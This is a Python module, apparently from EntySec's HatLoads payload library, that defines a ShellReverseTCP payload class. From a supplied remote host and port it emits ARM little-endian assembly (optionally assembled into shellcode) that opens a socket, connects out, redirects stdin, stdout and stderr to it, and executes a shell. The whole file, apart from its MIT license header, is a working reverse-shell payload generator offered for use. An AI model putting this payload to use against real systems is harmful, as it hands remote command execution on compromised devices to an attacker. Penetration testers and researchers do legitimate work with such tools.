#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            mov r0, #2
            mov r1, #1
            add r2, r1, #5
            mov r7, #140
            add r7, r7, #141
            svc 0

            mov r6, r0
            add r1, pc, #96
            mov r2, #16
            mov r7, #141
            add r7, r7, #142
            svc 0

            mov r1, #3

        dup:
            sub r1, 1
            mov r0, r6
            mov r7, #63
            svc 0

            cmp r1, #0
            bne dup

            add r0, pc, #36
            eor r4, r4, r4
            push \{r4\}
            mov r2, sp
            add r4, pc, #36
            push \{r4\}
            mov r1, sp
            mov r7, #11
            svc 0
        """

        if assemble:
            return self.assemble('armle', shellcode)
        return shellcode
